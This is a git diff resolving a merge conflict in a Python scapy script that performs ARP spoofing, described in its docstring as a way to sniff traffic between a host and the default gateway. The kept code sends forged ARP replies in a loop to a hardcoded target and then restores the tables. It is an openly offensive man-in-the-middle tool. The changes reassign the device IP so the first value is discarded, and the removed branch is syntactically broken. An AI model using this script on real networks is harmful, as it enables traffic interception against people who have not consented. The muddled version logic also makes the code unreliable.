@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 '''
 MAC spoofing is mainly used to sniff packets being sent between
 a host and the default gateway. To change your mac address to look
@@ -22,19 +21,21 @@ from scapy.all import conf, getmacbyip, ARP, send
 # Network interface to use
 interface = 'wlan0'
 
-# Getting default gateway information
-default_gateway_ip = conf.route.route("0.0.0.0")[2]
+# Device you want to be ip address
+device_ip = '192.168.0.188'
 
 # Getting device information
 device_ip = conf.route.route("0.0.0.0")[1]
 
-# Target infomation
+# The device you want to make think you are a different device
+# To make all devices on a network think you are a different device
+# you need to loop through all hosts and send the ARP response packet
 target_ip = '192.168.0.88'
 
 def spoof(destinationIP, sourceIP):
-    destinationMAC = getmacbyip(destinationIP)
-    packet = ARP(op=2, hwdst=destinationMAC, pdst=destinationIP, psrc=sourceIP)
-    send(packet, iface=interface, verbose=False)
+    destinationMAC = getmacbyip(destinationIP) # Get the mac address of the target
+    packet = ARP(op=2, hwdst=destinationMAC, pdst=destinationIP, psrc=sourceIP) # Create the packet, op=2 meaning we are replying
+    send(packet, iface=interface, verbose=False) # Sending the packet using the specified interface
 
 def restore(destinationIP, sourceIP):
     destinationMAC = getmacbyip(destinationIP)
@@ -44,28 +45,10 @@ def restore(destinationIP, sourceIP):
 
 try:
     print("Spoofing...")
-    while True:
-        spoof(target_ip, default_gateway_ip)
-        spoof(default_gateway_ip, target_ip)
+    while True: # Constantly sending packets
+        spoof(target_ip, device_ip)
+        spoof(device_ip, target_ip)
 except KeyboardInterrupt:
-    print("Restoring...")
-    restore(target_ip, default_gateway_ip)
-    restore(default_gateway_ip, target_ip)
-=======
-import scapy
-
-interface = 'lo'
-
-def spoof(target_ip, spoof_ip):
-    # get mac address of target
-    packet = scapy.ARP(op=2, hwdst=mac, psdt=target_ip, prsrc=spoof_ip)
-    scapy.send(packet, iface=interface, verbose=False)
-
-def restore(dest_ip, source_ip):
-    dest_mac = #mac
-    src_mac = #mac
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
-    scapy.send(packet, iface=interface, verbose=False)
-
-# While loop spoofing targets
->>>>>>> 18a8f677b5de81953c81741dae8adeb3944460b5
+    print("Restoring...") # Changing the ARP table back to normal
+    restore(target_ip, device_ip)
+    restore(device_ip, target_ip)
